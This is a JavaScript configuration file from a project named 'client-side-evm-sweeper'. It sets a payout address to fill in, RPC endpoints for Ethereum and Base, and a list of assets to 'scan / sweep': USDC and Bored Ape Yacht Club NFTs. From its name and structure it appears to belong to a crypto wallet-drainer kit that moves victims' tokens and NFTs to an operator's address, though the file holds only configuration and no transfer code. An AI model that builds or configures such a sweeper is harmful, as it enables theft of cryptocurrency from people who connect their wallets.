// client-side-evm-sweeper/src/config/network-manifest.js

/**
 * NETWORK MANIFEST - Production Grade Configuration
 * Centralized, validated, and secure config for all networks and payout targets.
 */

export const networkManifest = {
  // =============================================
  // PAYOUT / RECEIVER CONFIGURATION (Critical)
  // =============================================
  EVM_PAYOUT_TARGET: {
    default: "0x0000000000000000000000000000000000000000", // ← CHANGE THIS
    
    // Optional: Per-chain override
    perChain: {
      // 1: "0xYourMainPayoutAddressHere",
      // 8453: "0xAnotherAddressForBase",
    }
  },

  // =============================================
  // NETWORKS CONFIGURATION
  // =============================================
  networks: [
    {
      chainId: 1,
      name: "Ethereum",
      rpcUrls: [
        "https://eth.llamarpc.com",
        "https://rpc.ankr.com/eth",
        "https://1rpc.io/eth"
      ],
      multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
      explorer: "https://etherscan.io",
      nativeCurrency: "ETH",
      maxGasMultiplier: 1.3,
    },
    {
      chainId: 8453,
      name: "Base",
      rpcUrls: [
        "https://mainnet.base.org",
        "https://base.llamarpc.com",
        "https://rpc.ankr.com/base"
      ],
      multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
      explorer: "https://basescan.org",
      nativeCurrency: "ETH",
      maxGasMultiplier: 1.4,
    },
    // Add more networks as needed...
  ],

  // =============================================
  // TARGET ASSETS TO SCAN / SWEEP
  // =============================================
  targets: [
    // Example ERC-20
    {
      id: "usdc-eth",
      chainId: 1,
      type: "erc20",
      address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
      metadata: { symbol: "USDC", label: "USD Coin" }
    },
    // Example NFT Collection
    {
      id: "bayc",
      chainId: 1,
      type: "erc721",
      address: "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d",
      metadata: { symbol: "BAYC", label: "Bored Ape Yacht Club" }
    },
  ]
};

// =============================================
// VALIDATION & SAFETY CHECKS
// =============================================
export function validateManifest() {
  const { EVM_PAYOUT_TARGET, networks, targets } = networkManifest;

  if (!EVM_PAYOUT_TARGET.default || 
      EVM_PAYOUT_TARGET.default === "0x0000000000000000000000000000000000000000") {
    console.warn("⚠️ WARNING: Default payout target is still the zero address!");
  }

  if (!networks || networks.length === 0) {
    throw new Error("No networks defined in networkManifest");
  }

  if (!targets || targets.length === 0) {
    console.warn("⚠️ No targets defined in networkManifest");
  }

  // Basic address validation
  const allAddresses = [
    EVM_PAYOUT_TARGET.default,
    ...Object.values(EVM_PAYOUT_TARGET.perChain || {})
  ];

  allAddresses.forEach(addr => {
    if (addr && !/^0x[a-fA-F0-9]{40}$/.test(addr)) {
      throw new Error(`Invalid Ethereum address in payout config: ${addr}`);
    }
  });

  console.log(`✅ Network manifest validated | ${networks.length} networks | ${targets.length} targets`);
}

// Auto-validate in development
if (typeof process !== 'undefined' && process.env.NODE_ENV !== 'production') {
  validateManifest();
}

export default networkManifest;